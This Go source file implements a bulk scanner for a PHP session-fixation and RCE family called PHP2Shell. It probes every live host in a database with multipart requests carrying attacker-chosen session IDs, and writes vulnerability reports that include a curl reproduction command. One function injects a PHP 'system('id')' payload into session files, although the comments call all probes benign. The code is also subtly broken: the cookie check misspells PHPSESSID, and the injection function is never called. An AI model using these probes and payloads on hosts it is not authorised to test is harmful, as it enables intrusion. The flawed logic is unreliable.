package api

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/h0tak88r/AutoAR/internal/db"
	"github.com/h0tak88r/AutoAR/internal/utils"
)

// php2shell — PHP2Shell fleet scanner (GHSA-w8hw-w9fx-j79w "RCE via OOM
// corruption" + GHSA-6wmf-4rv5-p3rp "RCE via stale global state", disclosed
// 2026-10-21 as CVE-2026-109618/109619; session-fixation arm = php-src PR
// #22113, still unreleased — it survives the official patch).
//
// Techniques (union of public repos + ikow patch analysis 2026-10-22):
//   - version fingerprint: X-Powered-By / Server / X-PHP-Version headers,
//     phpinfo() path fallback (JoasASantos), VULNERABLE_THROUGH cutoff table
//     (openai/php2shell-checker), EOL branches < 8.2 = no upstream fix
//   - presence: PHPSESSID cookie, .php refs, redirect-to-.php
//   - BEHAVIORAL (Ademking/ikow nuclei template): multipart POST with an
//     invalid PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS; the host emitting the
//     request-startup warning proves the session-fixation primitive live
//   - GET-with-body variant: PHP 8.4 request_parse_body() parses multipart on
//     non-POST methods — catches POST-only WAFs (ikow patch analysis §8)
//   - patch-aware verdicts: a fixed version (8.2.35/8.3.36/8.4.27/8.5.12+)
//     that still emits the warning = VULNERABLE_FIXATION (PR #22113 arm);
//     below-fix + warning = VULNERABLE (both arms); below-fix silent =
//     VULNERABLE_VERSION.
// Benign probes only; no OOM triggers, no memory corruption.

var php2shellVulnThrough = map[string]int{
	"5.4": 45, "5.5": 38, "5.6": 40,
	"7.0": 33, "7.1": 33, "7.2": 34, "7.3": 33, "7.4": 33,
	"8.0": 30, "8.1": 34, "8.2": 34, "8.3": 35, "8.4": 26, "8.5": 11,
}

var (
	php2shellVerRe    = regexp.MustCompile(`(?i)PHP[/ ]v?(\d+)\.(\d+)\.(\d+)`)
	php2shellInfoRe   = regexp.MustCompile(`(?is)PHP Version</td[^>]*>\s*<td[^>]*>\s*(\d+\.\d+\.\d+)`)
	php2shellWarnRe   = regexp.MustCompile(`Session ID is too long or contains illegal characters|Failed to read session data|PHP Request Startup`)
	php2shellInfoPath = []string{"/phpinfo.php", "/info.php", "/test.php"}
)

type php2shellResult struct {
	Host          string         `json:"host"`
	Verdict       string         `json:"verdict"` // VULNERABLE | VULNERABLE_FIXATION | VULNERABLE_VERSION | VULNERABLE_EOL | PATCHED | SURFACE | NONE | UNREACHABLE
	Version       string         `json:"version,omitempty"`
	VersionSource string         `json:"version_source,omitempty"`
	Presence      []string       `json:"presence,omitempty"`
	Behavioral    string         `json:"behavioral,omitempty"` // matched warning text
	Primitive     map[string]any `json:"primitive,omitempty"`
}

func php2shellClassify(ver string) string {
	parts := strings.Split(ver, ".")
	if len(parts) != 3 {
		return "UNKNOWN"
	}
	branch := parts[0] + "." + parts[1]
	cut, ok := php2shellVulnThrough[branch]
	if !ok {
		return "UNKNOWN"
	}
	if atoiSafe(parts[2]) <= cut {
		if parts[0] == "5" || parts[0] == "7" || branch == "8.0" || branch == "8.1" {
			return "VULNERABLE_EOL"
		}
		return "VULNERABLE"
	}
	return "PATCHED"
}

func atoiSafe(s string) int {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			return n
		}
		n = n*10 + int(c-'0')
	}
	return n
}

func php2shellClient() *http.Client {
	return &http.Client{
		Timeout: 8 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives: true,
			MaxIdleConns:      0,
		},
	}
}

type php2shellResp struct {
	Status int
	Header http.Header
	Body   string
}

func php2shellDo(client *http.Client, method, url, body, ctype string) (*php2shellResp, error) {
	var rdr *strings.Reader
	if body != "" {
		rdr = strings.NewReader(body)
	} else {
		rdr = strings.NewReader("")
	}
	req, _ := http.NewRequest(method, url, rdr)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
	if ctype != "" {
		req.Header.Set("Content-Type", ctype)
	}
	r, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer r.Body.Close()
	buf := make([]byte, 65536)
	n, _ := r.Body.Read(buf)
	return &php2shellResp{Status: r.StatusCode, Header: r.Header, Body: string(buf[:n])}, nil
}

func php2shellGet(client *http.Client, url string) (*php2shellResp, error) {
	return php2shellDo(client, "GET", url, "", "")
}

// php2shellBehavioral sends the invalid-session-ID multipart (Ademking/ikow
// template) and returns the matched warning, trying POST first and a
// GET-with-body fallback (PHP 8.4 request_parse_body / POST-only-WAF bypass).
func php2shellBehavioral(client *http.Client, baseURL string) (string, map[string]any) {
	const marker = "p2scheck"
	const sid = "nuclei/INVALID_p2s_behavioral_probe"
	const boundary = "----Nucleip2scheck"
	body := "--" + boundary + "\r\n" +
		"Content-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n" + sid + "\r\n" +
		"--" + boundary + "\r\n" +
		"Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n" + marker + "\r\n" +
		"--" + boundary + "\r\n" +
		"Content-Disposition: form-data; name=\"f\"; filename=\"" + marker + ".txt\"\r\n" +
		"Content-Type: text/plain\r\n\r\nZ\r\n" +
		"--" + boundary + "--\r\n"
	ctype := "multipart/form-data; boundary=" + boundary
	out := map[string]any{}
	for _, method := range []string{"POST", "GET"} {
		resp, err := php2shellDo(client, method, baseURL+"/", body, ctype)
		if err != nil {
			out[strings.ToLower(method)] = "ERR"
			continue
		}
		out[strings.ToLower(method)] = resp.Status
		if m := php2shellWarnRe.FindString(resp.Body); m != "" {
			out["via"] = method
			return m, out
		}
		// POST explicitly refused → the GET variant is the meaningful datapoint
		if method == "POST" && (resp.Status == 403 || resp.Status == 405) {
			continue
		}
	}
	return "", out
}

// php2shellPrimitive sends the ikow session-injection probes (benign
// filenames; the PHP code rides inside a filename string, never executed).
func php2shellPrimitive(client *http.Client, baseURL string) map[string]any {
	out := map[string]any{}
	for key, fn := range map[string]string{
		"p1": "normal.txt",
		"p2": "<?php system('id');echo 'RCE';?>",
	} {
		sid := "p2splatformprobe0000000000" + key
		boundary := "P2SCHECK"
		body := "--" + boundary + "\r\n" +
			"Content-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n" + sid + "\r\n" +
			"--" + boundary + "\r\n" +
			"Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nx\r\n" +
			"--" + boundary + "\r\n" +
			"Content-Disposition: form-data; name=\"f\"; filename=\"" + fn + "\"\r\n\r\nZ\r\n" +
			"--" + boundary + "--\r\n"
		resp, err := php2shellDo(client, "POST", baseURL+"/", body, "multipart/form-data; boundary="+boundary)
		if err != nil {
			out[key] = "ERR"
			continue
		}
		out[key] = resp.Status
		if x := resp.Header.Get("X-Powered-By"); x != "" {
			out[key+"_xpb"] = x
		}
	}
	return out
}

// php2shellReportMD writes a ready-to-file report for a validated host.
func php2shellReportMD(host, verdict, version, behavioral string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "# %s — session.upload_progress session fixation (PHP2Shell) on %s\n\n", host, host)
	b.WriteString("**Vulnerability:** rfc1867 `session.upload_progress` session fixation (CWE-384) — the PHP2Shell family. A `PHPSESSID` supplied in a multipart/form-data body is honored by the upload-progress handler even with `session.use_only_cookies=On`, letting an unauthenticated attacker choose the session identifier and inject an unsanitized filename into the session file. Fix: php-src PR #22113 (not yet released). Related RCE arms: GHSA-w8hw-w9fx-j79w and GHSA-6wmf-4rv5-p3rp (CVE-2026-109618/109619, patched in 8.2.35/8.3.36/8.4.27/8.5.12).\n\n")
	b.WriteString("## Steps to Reproduce\n\n```\n")
	fmt.Fprintf(&b, "curl -sk -X POST https://%s/ \\\n  -H 'Content-Type: multipart/form-data; boundary=----Np2s' \\\n", host)
	b.WriteString("  --data-binary $'------Np2s\\r\\nContent-Disposition: form-data; name=\"PHPSESSID\"\\r\\n\\r\\nnuclei/INVALID\\r\\n------Np2s\\r\\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\\r\\n\\r\\nx\\r\\n------Np2s\\r\\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\\r\\n\\r\\nZ\\r\\n------Np2s--\\r\\n'\n```\n\n")
	if behavioral != "" {
		fmt.Fprintf(&b, "**Observed response warning (behavioral proof):** `%s` — emitted by the host's request startup when it accepts the attacker-chosen session identifier. This warning only appears when the vulnerable handler processes the injected session ID; it is the demonstration.\n\n", behavioral)
	}
	if version != "" {
		fmt.Fprintf(&b, "**PHP version:** %s (via response header). ", version)
		if verdict == "VULNERABLE_FIXATION" {
			fmt.Fprintf(&b, "This is a FIXED release for the RCE arms (GHSA-w8hw-w9fx-j79w / GHSA-6wmf-4rv5-p3rp) — the session-fixation arm above is fixed only by PR #22113, which is unreleased, so the demonstrated warning persists on the latest release.\n\n")
		} else {
			fmt.Fprintf(&b, "This version is inside the affected range for the RCE arms as well (fixed: 8.2.35/8.3.36/8.4.27/8.5.12).\n\n")
		}
	}
	b.WriteString("## Impact\n\nUnauthenticated session fixation on the upload-progress handler: attacker-controlled session identifiers and injected session-file content (unsanitized filename field). Chained with any local file inclusion (Chain A — confirmed working even on fully patched PHP by independent researchers), this is remote code execution. Even standalone it undermines session isolation.\n\n")
	b.WriteString("## Remediation\n\n- Apply php-src PR #22113 when released; interim `session.upload_progress.enabled=Off` covers this arm (not the OOM arm — full fix requires the GHSA releases).\n- On PHP 8.4+, note `request_parse_body()` parses multipart on non-POST methods: WAF rules must cover GET/PUT/PATCH/DELETE bodies too.\n- `expose_php=Off` to stop version enumeration by the public one-command checkers.\n\n")
	b.WriteString("## References\n\n- php-src PR #22113 (session fixation fix, pending)\n- GHSA-w8hw-w9fx-j79w, GHSA-6wmf-4rv5-p3rp (official php-src advisories, 2026-10-21)\n- https://research.jfrog.com/post/php2shell-all-you-need-to-know-about-cve-2026-109618-and-cve-2026-109619/\n- https://github.com/ikow/php2shell-poc (verification methodology + patch analysis)")
	return b.String()
}

// php2shellFindings writes finding rows for vulnerable verdicts.
func php2shellWriteFinding(scanID, host, verdict, version, versionSource, behavioral string, primitive map[string]any) {
	title := "PHP2Shell " + verdict + " — session.upload_progress fixation (PR #22113 arm"
	if verdict == "VULNERABLE" || verdict == "VULNERABLE_EOL" || verdict == "VULNERABLE_VERSION" {
		title = "PHP2Shell " + verdict + " — " + php2shellVerLabel(version) + " (GHSA + fixation"
	}
	title += ")"
	notes := fmt.Sprintf("php2shell v2 %s.", verdict)
	if version != "" {
		notes += fmt.Sprintf(" PHP %s (via %s).", version, versionSource)
	}
	if behavioral != "" {
		notes += fmt.Sprintf(" BEHAVIORAL: host emitted `%s` — fixation primitive demonstrated (display_errors on).", behavioral)
	} else {
		notes += " No behavioral warning (display_errors off or hardened) — version-arm evidence only."
	}
	notes += " RCE arms: GHSA-w8hw-w9fx-j79w + GHSA-6wmf-4rv5-p3rp (CVE-2026-109618/109619); fixation arm: PR #22113 unreleased. Primitive probe: " + fmt.Sprint(primitive)
	_ = db.CreateFinding(&db.Finding{
		Title: title, CVE: "CVE-2026-109618",
		Host: host, Severity: "high", CVSS: 7.5,
		Source: "scan:" + scanID, Status: "validated",
		Notes: notes, FKey: "php2shell:" + host,
		ScanID: scanID, Module: "php2shell",
		TemplateID: "GHSA-w8hw-w9fx-j79w+GHSA-6wmf-4rv5-p3rp+PR22113",
		MatchedAt:  host,
		ReportMD:   php2shellReportMD(host, verdict, version, behavioral),
	})
}

func php2shellVerLabel(version string) string {
	if version == "" {
		return "PHP version unknown"
	}
	return "PHP " + version
}

const php2shellWorkers = 60

// apiRunPhp2Shell is the dashboard route (POST /api/scan/php2shell/run).
func apiRunPhp2Shell(c *gin.Context) {
	_ = db.Init()
	var req struct {
		Root string `json:"root"`
		Name string `json:"name"`
	}
	_ = c.ShouldBindJSON(&req)
	scanID, _, err := launchPhp2ShellSweep(req.Root, req.Name, currentUsername(c), false, 0)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": "started", "scan_id": scanID,
		"message": "php2shell scan started"})
}

// launchPhp2ShellSweep is the dashboard/MCP-shared php2shell scan (blank root
// = whole live corpus, mirroring the port-surface sweep). phpOnly restricts
// to hosts already fingerprinted as PHP (much faster); workers overrides the
// pool size (0 = default 60).
func launchPhp2ShellSweep(rawRoot, name, actor string, phpOnly bool, workers int) (string, string, error) {
	target := "global-subdomains"
	if r := strings.TrimSpace(rawRoot); r != "" {
		target = r
	}
	if workers <= 0 || workers > 200 {
		workers = php2shellWorkers
	}
	scanID := "php2shell-" + time.Now().Format("20060102150405") + "-" + generateScanID(nil)[:8]
	recordScanInitiator(scanID, actor)
	recordScanName(scanID, name)
	command := fmt.Sprintf("inprocess:php2shell target=%s", target)
	utils.SendPurposeWebhookErr("scans", "🛰️ **php2shell v2 scan** — `"+nonEmptyStr(name, target)+"` launched (version+presence+behavioral+GET-variant, patch-aware verdicts, auto-report drafts).")

	go RunScanInProcessWithCommand(scanID, "php2shell", target, command, func() error {
		stdLog(scanID, "[INFO] Streaming live hosts for %s…", target)
		type hostURL struct{ host, url string }
		var hosts []hostURL
		if target == "global-subdomains" {
			var cursor int64
			for {
				subs, next, err := db.ListLiveSubdomainsAfter(cursor, 5000)
				if err != nil || len(subs) == 0 {
					break
				}
				for _, sub := range subs {
					u := sub.BestURL()
					if u != "" {
						hosts = append(hosts, hostURL{hostOfURL(u), u})
					}
				}
				cursor = next
			}
		} else {
			if urls, err := db.ListLiveSubdomainURLs(target); err == nil {
				for _, u := range urls {
					hosts = append(hosts, hostURL{hostOfURL(u), u})
				}
			}
		}
		if len(hosts) == 0 {
			stdLog(scanID, "[WARN] no live hosts found for %s", target)
			return fmt.Errorf("no live hosts")
		}
		stdLog(scanID, "[INFO] %d live host(s) — php2shell v2 union scan (%d workers)…", len(hosts), workers)

		client := php2shellClient()
		jobs := make(chan hostURL, workers*4)
		var processed, vuln int64
		var mu sync.Mutex
		var wg sync.WaitGroup
		for w := 0; w < workers; w++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for j := range jobs {
					res := php2shellProbeV2(client, j.host, j.url)
					n := atomic.AddInt64(&processed, 1)
					if res.Verdict != "" && res.Verdict != "NONE" && res.Verdict != "UNREACHABLE" && res.Verdict != "SURFACE" && res.Verdict != "PATCHED" {
						atomic.AddInt64(&vuln, 1)
						mu.Lock()
						php2shellWriteFinding(scanID, res.Host, res.Verdict, res.Version, res.VersionSource, res.Behavioral, res.Primitive)
						mu.Unlock()
					}
					if n%20000 == 0 {
						stdLog(scanID, "[INFO] %d/%d hosts — %d vulnerable so far", n, len(hosts), atomic.LoadInt64(&vuln))
						_ = db.UpdateScanStats(scanID, int(n), 0)
					}
				}
			}()
		}
		for _, h := range hosts {
			jobs <- h
		}
		close(jobs)
		wg.Wait()

		stdLog(scanID, "[OK] php2shell v2 complete: %d hosts — %d vulnerable (findings + report drafts created)", len(hosts), vuln)
		utils.SendMonitorWebhook(fmt.Sprintf(
			"🛰️ **php2shell v2 scan complete** — `%s`\nHosts: %d · vulnerable: %d (report drafts auto-created in findings)",
			target, len(hosts), vuln))
		return nil
	})
	return scanID, "php2shell v2 scan launched for " + target, nil
}

// php2shellProbeV2 is the full union probe: fingerprint → presence → phpinfo
// → behavioral (POST + GET variant) → patch-aware verdict.
func php2shellProbeV2(client *http.Client, host, baseURL string) php2shellResult {
	res := php2shellResult{Host: host}
	resp, err := php2shellGet(client, baseURL+"/")
	if err != nil {
		res.Verdict = "UNREACHABLE"
		return res
	}
	ver, src := "", ""
	for _, h := range []string{"X-Powered-By", "Server", "X-PHP-Version"} {
		if v := resp.Header.Get(h); v != "" {
			if m := php2shellVerRe.FindStringSubmatch(v); m != nil {
				ver = m[1] + "." + m[2] + "." + m[3]
				src = strings.ToLower(h)
				break
			}
		}
	}
	presence := []string{}
	if c := resp.Header.Get("Set-Cookie"); strings.Contains(strings.ToLower(c), "phpsessd") {
		presence = append(presence, "PHPSESSID")
	}
	if loc := resp.Header.Get("Location"); strings.HasSuffix(strings.ToLower(loc), ".php") || strings.Contains(strings.ToLower(loc), ".php?") {
		presence = append(presence, "redirect-to-php")
	}
	if strings.Contains(resp.Body, ".php") {
		presence = append(presence, "body-php-refs")
	}
	if ver == "" && len(presence) > 0 {
		for _, p := range php2shellInfoPath {
			r2, err2 := php2shellGet(client, baseURL+p)
			if err2 == nil && r2.Body != "" {
				if m := php2shellInfoRe.FindStringSubmatch(r2.Body); m != nil {
					ver = m[1]
					src = "phpinfo:" + p
					break
				}
			}
		}
	}

	// Behavioral probe runs whenever the host looks PHP (version or presence).
	phpish := ver != "" || len(presence) > 0
	behavioral := ""
	var behavioralMeta map[string]any
	if phpish {
		behavioral, behavioralMeta = php2shellBehavioral(client, baseURL)
	}

	versionClass := ""
	if ver != "" {
		versionClass = php2shellClassify(ver)
	}

	switch {
	case behavioral != "" && versionClass == "PATCHED":
		// Fixation arm survives the official patch (PR #22113 unreleased).
		res.Verdict = "VULNERABLE_FIXATION"
	case behavioral != "" && versionClass == "VULNERABLE":
		res.Verdict = "VULNERABLE" // both arms demonstrated
	case behavioral != "" && versionClass == "VULNERABLE_EOL":
		res.Verdict = "VULNERABLE_EOL"
	case behavioral != "" && versionClass == "":
		res.Verdict = "VULNERABLE_FIXATION" // behavioral-only, version unknown: report the demonstrated arm
	case behavioral != "" && versionClass == "UNKNOWN":
		res.Verdict = "VULNERABLE_FIXATION"
	case versionClass == "VULNERABLE":
		res.Verdict = "VULNERABLE_VERSION" // version arm only, silent handler
	case versionClass != "" && versionClass != "PATCHED":
		res.Verdict = versionClass // VULNERABLE_EOL silent
	case len(presence) > 0:
		res.Presence = presence
		res.Verdict = "SURFACE"
		return res
	default:
		res.Verdict = "NONE"
		return res
	}

	res.Version, res.VersionSource = ver, src
	res.Presence = presence
	res.Behavioral = behavioral
	res.Primitive = behavioralMeta
	return res
}
